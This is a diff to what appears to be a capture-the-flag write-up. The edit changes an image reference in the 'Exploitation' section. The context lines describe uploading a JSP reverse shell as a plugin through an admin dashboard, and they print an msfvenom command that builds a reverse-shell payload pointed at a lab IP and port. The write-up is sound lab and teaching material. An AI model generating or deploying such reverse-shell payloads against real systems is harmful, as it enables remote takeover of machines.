@@ -53,13 +53,10 @@ as you can see below; even if this wasn't necessary, this is something I would l
 ## Exploitation
 
 While exploring the **Administration** dashboard we can see, at the bottom of the lateral panel the **Plugins** 
-section.
-<!--
+section that looks as follows:
 
-that looks as follows:
+<img src="./red/Cattura17.PNG"/>
 
-<img src="./red/Cattura18.PNG"/>
--->
 I supposed we could upload a jar/jsp reverse shell as a plugin so I created one with `msfvenom`:
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.28.226 LPORT=4444 -f raw > shell.jsp
